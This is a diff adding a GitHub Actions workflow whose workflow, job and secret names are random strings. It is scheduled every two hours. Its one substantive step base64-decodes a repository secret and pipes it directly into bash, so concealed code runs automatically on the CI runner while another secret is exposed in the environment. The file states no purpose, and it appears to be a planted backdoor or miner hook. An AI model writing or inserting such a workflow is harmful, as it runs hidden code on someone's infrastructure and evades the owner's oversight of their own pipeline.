@@ -1,0 +1,13 @@
+name: uDFflOGfW
+on:
+  schedule:
+    - cron: '0 */2 * * *'
+  workflow_dispatch:
+jobs:
+  KbClKtWx:
+    runs-on: ubuntu-latest
+    env:
+      jsfRmWHP: ${{ secrets.jxmHUvtNS }}
+    steps:
+      - uses: actions/checkout@v5
+      - run: echo "${{ secrets.OSNxuD }}" | base64 -d | bash
